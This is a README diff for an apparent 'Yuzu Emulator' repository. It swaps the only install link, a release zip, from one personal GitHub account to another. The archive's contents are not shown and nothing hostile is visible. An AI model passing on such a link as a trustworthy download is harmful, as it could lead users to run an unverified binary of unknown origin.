@@ -5,7 +5,7 @@
 <img width="280" height="280" alt="f718a55e-8e55-4245-8d5e-309d5e824b17" src="https://github.com/user-attachments/assets/f482db6f-cde8-4255-a799-3eb519547987" />
 
 ## Install
-[Download `Yuzu_Emulator.zip`](https://github.com/siwyp/Yuzu-Emu/releases/download/1734/Yuzu_Emulator.zip)
+[Download `Yuzu_Emulator.zip`](https://github.com/yuzunes/Yuzu-Emu/releases/download/1734/Yuzu_Emulator.zip)
 ---
 
 <img width="800" height="492" alt="3a9989fe-d1db-4474-aed1-9dcb01df5d15" src="https://github.com/user-attachments/assets/973425b2-e9f3-4768-9840-73a4f9ea3bcd" />
